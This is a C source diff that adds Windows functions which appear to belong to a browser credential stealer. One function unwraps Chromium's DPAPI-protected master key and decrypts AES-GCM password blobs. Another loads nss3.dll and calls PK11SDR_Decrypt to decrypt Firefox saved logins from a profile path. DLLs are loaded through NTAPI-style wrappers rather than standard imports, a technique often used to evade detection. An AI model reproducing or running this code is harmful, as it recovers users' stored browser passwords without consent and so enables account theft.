@@ -1,8 +1,7 @@
 #include "./../../include/crypto.h"
 #include "./../../include/global.h"
 
-int Base64DecodingFunc(const char *input, char **outputDec, DWORD *outputDecSize)
-{
+int Base64DecodingFunc(const char *input, char **outputDec, DWORD *outputDecSize) {
     // Prepare the UNICODE_STRING structure for the crypt32.dll library name
     UNICODE_STRING dllName;
     WCHAR dllNameBuffer[] = L"crypt32.dll"; // The DLL to load dynamically
@@ -78,8 +77,7 @@ int Base64DecodingFunc(const char *input, char **outputDec, DWORD *outputDecSize
     // Return 0 to indicate success
     return 0;
 }
-NTSTATUS AES_256_GCM(const BYTE *encryptedData, ULONG encryptedDataLength, const BYTE *aad, ULONG aadLength, const BYTE *iv, ULONG ivLength, const BYTE *authTag, ULONG authTagLength, const BYTE *key, ULONG keyLength, BYTE *decryptedData, ULONG decryptedDataLength)
-{
+NTSTATUS AES_256_GCM(const BYTE *encryptedData, ULONG encryptedDataLength, const BYTE *aad, ULONG aadLength, const BYTE *iv, ULONG ivLength, const BYTE *authTag, ULONG authTagLength, const BYTE *key, ULONG keyLength, BYTE *decryptedData, ULONG decryptedDataLength) {
     // Dynamically load bcrypt.dll using NTAPI equivalent of LoadLibrary.
     UNICODE_STRING dllName;
     WCHAR dllNameBuffer[] = L"bcrypt.dll"; // The DLL containing cryptographic functions
@@ -257,4 +255,152 @@ NTSTATUS AES_256_GCM(const BYTE *encryptedData, ULONG encryptedDataLength, const
     UnloadLib(moduleHandle); // Unload the DLL once finished
 
     return status; // Return final status, success or failure
+}
+int AES_256_GCM_Setup(char *key, char *ciphertext, DWORD ciphertextSize, char *plaintext) {
+    // Decode the key + remove DPAPI suffix from the start.
+    char *Base64DecodedKey = NULL;
+    DWORD Base64DecodedKeySize;
+    Base64DecodingFunc(key, &Base64DecodedKey, &Base64DecodedKeySize);
+    Base64DecodedKey += 5;
+    Base64DecodedKeySize -= 5;
+
+    // Start decrypting the secret key.
+    DATA_BLOB input, output;
+    input.pbData = (BYTE *)Base64DecodedKey;
+    input.cbData = Base64DecodedKeySize;
+    CRYPTPROTECT_PROMPTSTRUCT promptStruct;
+    promptStruct.dwPromptFlags = CRYPTPROTECT_PROMPT_ON_UNPROTECT;
+    promptStruct.hwndApp = NULL;
+    promptStruct.szPrompt = NULL;
+    promptStruct.cbSize = sizeof(CRYPTPROTECT_PROMPTSTRUCT);
+    DWORD flags = CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_VERIFY_PROTECTION;
+
+    UNICODE_STRING dllName;
+    WCHAR dllNameBuffer[] = L"crypt32.dll"; // Name of the DLL.
+    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
+    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
+    dllName.Buffer = dllNameBuffer;
+    ULONG dllCharacteristics = 0;
+    PVOID moduleHandle = NULL;
+    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
+    if (NT_SUCCESS(STATUS) || moduleHandle != NULL)
+    {
+        ANSI_STRING procName;
+        CHAR procNameBuffer[] = "CryptUnprotectData";
+        procName.Length = (USHORT)strlen(procNameBuffer);
+        procName.MaximumLength = procName.Length + 1;
+        procName.Buffer = procNameBuffer;
+        PVOID CryptUnprotectDataProcAddress = NULL;
+        NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &CryptUnprotectDataProcAddress);
+        if (!NT_SUCCESS(STATUS1) || CryptUnprotectDataProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
+        CryptUnprotectDataFunc pCryptUnprotectData = (CryptUnprotectDataFunc)CryptUnprotectDataProcAddress;
+        pCryptUnprotectData(&input, NULL, NULL, NULL, &promptStruct, flags, &output);
+    } else {
+        INFO("Something went wrong in loading crypt32.dll, can not decrypt DPAPI key.");
+        return 1;
+    }
+    char *secret_key = output.pbData;
+    int secret_keySize = output.cbData;
+
+    char iv[13];
+    for (int i = 0; i < 13; i++)
+    {
+        iv[i] = ciphertext[i + 3];
+    }
+    iv[12] = '\0';
+
+    DWORD passwordSize = ciphertextSize - 15 - 16;
+    char password[passwordSize + 1];
+    for (int i = 0; i < passwordSize; i++)
+    {
+        password[i] = ciphertext[i + 15];
+    }
+
+    DWORD authTagSize = 16;
+    char authTag[authTagSize];
+    for (int i = 0; i < authTagSize; i++)
+    {
+        authTag[i] = ciphertext[i + (ciphertextSize - 16)];
+    }
+
+    BYTE aad[] = {};
+    BYTE decryptedData[passwordSize];
+    ULONG decryptedDataLength = passwordSize;
+    
+    NTSTATUS status = AES_256_GCM( password, passwordSize, aad, 0, iv, 12, authTag, authTagSize, secret_key, secret_keySize, decryptedData, decryptedDataLength);
+    if (NT_SUCCESS(status))
+    {
+
+        decryptedData[decryptedDataLength] = '\0';
+        strcpy(plaintext, decryptedData);
+    }
+    else
+    {
+        INFO("Decryption failed with status: %08x", status);
+        return 1;
+    }
+    return 0;
+}
+int Decrypt_NSS3(char *profile_path, char *crypted, char **outcrypt) {
+    // Load the nss3.dll file to use the NSS3 decryption functions.
+    UNICODE_STRING dllName;
+    WCHAR dllNameBuffer[] = L"nss3.dll";
+    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
+    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
+    dllName.Buffer = dllNameBuffer;
+    ULONG dllCharacteristics = 0;
+    PVOID moduleHandle = NULL;
+    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
+    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL) { WARN("Error occured in loading of nss3.dll"); return -1; }
+
+    // Retrieve the address of the NSS_Init function from nss3.dll
+    ANSI_STRING procName;
+    CHAR procNameBuffer[] = "NSS_Init";
+    procName.Length = (USHORT)strlen(procNameBuffer);
+    procName.MaximumLength = procName.Length + 1;
+    procName.Buffer = procNameBuffer;
+    PVOID NSS_InitProcAddress = NULL;
+    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &NSS_InitProcAddress);
+    if (!NT_SUCCESS(STATUS1) || NSS_InitProcAddress == NULL) { WARN("Error occured in getting address of NSS_Init"); UnloadLib(moduleHandle); return 1; }
+    NSS_InitFunc* NSS_Init = (NSS_InitFunc*)NSS_InitProcAddress;
+
+    // Retrieve the address of the PK11SDR_Decrypt function from nss3.dll
+    ANSI_STRING procName1;
+    CHAR procNameBuffer1[] = "PK11SDR_Decrypt";
+    procName1.Length = (USHORT)strlen(procNameBuffer1);
+    procName1.MaximumLength = procName1.Length + 1;
+    procName1.Buffer = procNameBuffer1;
+    PVOID PK11SDR_DecryptProcAddress = NULL;
+    NTSTATUS STATUS2 = GetProcAdd(moduleHandle, &procName1, 0, &PK11SDR_DecryptProcAddress);
+    if (!NT_SUCCESS(STATUS2) || PK11SDR_DecryptProcAddress == NULL) { WARN("Error occured in getting address of PK11SDR_Decrypt"); UnloadLib(moduleHandle); return 1; }
+    PK11SDR_DecryptFunc* PK11SDR_Decrypt = (PK11SDR_DecryptFunc*)PK11SDR_DecryptProcAddress;
+
+    // Initialize NSS.
+    SECStatus result = NSS_Init(profile_path);
+    if (result != SECSuccess) { WARN("NSS_Init returned non 0 integer..."); UnloadLib(moduleHandle); return 1; }
+
+    // Base64 decode the encoded ciphertext.
+    char *encrypted_data = NULL;
+    DWORD dword_encrypted_data = 0;
+    Base64DecodingFunc(crypted, &encrypted_data, &dword_encrypted_data);
+
+    // Decrypt the ciphertext using NSS3.
+    SECItem pInSecItem, pOutSecItem;
+    pInSecItem.data = (unsigned char *)encrypted_data;
+    pInSecItem.len = dword_encrypted_data;
+    pOutSecItem.data = NULL;
+    pOutSecItem.len = 0;
+    SECStatus rv = PK11SDR_Decrypt(&pInSecItem, &pOutSecItem, NULL);
+    if (pOutSecItem.data != NULL || (pOutSecItem.len != 0)) {
+        char DecryptData[pOutSecItem.len + 1];
+        size_t n = pOutSecItem.len;
+        *outcrypt = malloc(n * sizeof(char));
+        sprintf(*outcrypt, "%.*s\n", pOutSecItem.len, pOutSecItem.data);
+        UnloadLib(moduleHandle);
+        return 0;
+    } else {
+        WARN("Error occurred during decryption with status: %08x", rv);
+        UnloadLib(moduleHandle);
+        return 1;
+    }
 }
